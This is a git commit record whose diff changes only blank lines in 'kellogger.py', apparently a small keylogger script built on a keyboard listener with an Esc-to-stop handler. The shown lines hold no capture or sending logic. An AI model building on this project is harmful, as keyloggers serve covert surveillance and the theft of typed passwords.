f0d9c290718066e121bfa7582f4c13ac214f5151
MarathaDada <goregaonkarnitish526@gmail.com>
2025-06-16 11:37:29 +0530

    new prg

--- kellogger.py
+++ kellogger.py
@@ -35,8 +35,7 @@ def on_release(key):
     if key == Key.esc:
         # Stop listener
         return False
- 
- 
+        
 with Listener(on_press = on_press,
               on_release = on_release) as listener:
                     
